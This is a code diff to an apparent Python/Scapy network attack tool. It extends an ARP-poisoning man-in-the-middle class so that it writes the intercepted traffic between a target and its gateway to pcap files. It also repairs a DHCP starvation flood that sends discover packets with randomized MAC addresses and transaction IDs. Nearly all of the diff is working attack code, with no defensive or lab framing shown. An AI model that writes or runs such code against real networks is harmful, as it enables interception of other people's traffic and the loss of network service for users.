@@ -1,12 +1,15 @@
 import threading
 import time
+import random
 from scapy.all import *
-from scapy.layers.inet import IP
+from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import ARP, Ether
+from scapy.layers.dhcp import BOOTP, DHCP
+from scapy.utils import mac2str
 
 
 class ArpPoisoning:
-    def __init__(self, target, gateway, iface):
+    def __init__(self, target, gateway, iface, do_save):
         self.target = target
         self.gateway = gateway
         self.attacker_mac = get_if_hwaddr(iface)
@@ -14,6 +17,24 @@ class ArpPoisoning:
         self.is_running = False
         self.__thread = None
         self.__sniff_thread = None
+        self.do_save = do_save
+        self.pcap_writer = None
+        
+        if self.do_save:
+            try:
+                import os
+                captures_dir = "captures"
+                if not os.path.exists(captures_dir):
+                    os.makedirs(captures_dir)
+                    
+                #set filename based on target and gateway IPs and timestamp
+                timestamp = time.strftime("%Y%m%d-%H%M%S")
+                self.pcap_filename = os.path.join(captures_dir, f"arp_poison_{self.target.ip_address}_{self.gateway.ip_address}_{timestamp}.pcap")
+                self.pcap_writer = PcapWriter(self.pcap_filename, append=True, sync=True)
+            except Exception as e:
+                print(f"Error initializing packet capture: {e}")
+                self.do_save = False
+
 
     def poison_tabels(self):
         """
@@ -57,12 +78,23 @@ class ArpPoisoning:
         if pkt[Ether].src == self.target.mac_address:
             pkt[Ether].src = self.attacker_mac
             pkt[Ether].dst = self.gateway.mac_address
+            #save packet to pcap if enabled
+            if self.do_save and self.pcap_writer:
+                try:
+                    self.pcap_writer.write(pkt)
+                except Exception as e:
+                    pass # Silently fail to avoid console spam during high-volume forwarding
             sendp(pkt, verbose=False, iface=self.iface)
 
         # traffic from gateway to target
         elif pkt[Ether].src == self.gateway.mac_address and pkt[IP].dst == self.target.ip_address:
             pkt[Ether].src = self.attacker_mac
             pkt[Ether].dst = self.target.mac_address
+            if self.do_save and self.pcap_writer:
+                try:
+                    self.pcap_writer.write(pkt)
+                except Exception as e:
+                    pass
             sendp(pkt, verbose=False, iface=self.iface)
 
     def restore_tables(self):
@@ -135,6 +167,12 @@ class ArpPoisoning:
             self.__sniff_thread.join()
 
         self.restore_tables()
+
+        if self.do_save and self.pcap_writer:
+            try:
+                self.pcap_writer.close()
+            except Exception as e:
+                print(f"Error closing packet capture: {e}")
         print("ARP poisoning stopped, ARP tables restored.")
 
 
@@ -145,16 +183,19 @@ class DoS:
         self.is_running = False
 
     def Dos_attack(self):
-        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src="") \
+        # packet template with static fields
+        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") \
                         / IP(src="0.0.0.0", dst="255.255.255.255") \
                         / UDP(sport=68, dport=67) \
-                        / BOOTP(op=1, chaddr="") \
-                        / DHCP(options=[("message-type", "discover"), ("end")])
+                        / BOOTP(op=1) \
+                        / DHCP(options=[("message-type", "discover"), "end"])
+        
         while self.is_running:
-            random_mac = RandMAC()
+            # update randomized fields
+            random_mac = str(RandMAC())
             dhcp_discover[Ether].src = random_mac
-            #convert to bytes for BOOTP chaddr field
-            dhcp_discover[BOOTP].chaddr = random_mac
+            dhcp_discover[BOOTP].chaddr = mac2str(random_mac)
+            dhcp_discover[BOOTP].xid = random.randint(0, 0xFFFFFFFF)
 
             sendp(dhcp_discover, iface=self.iface, verbose=False)
 
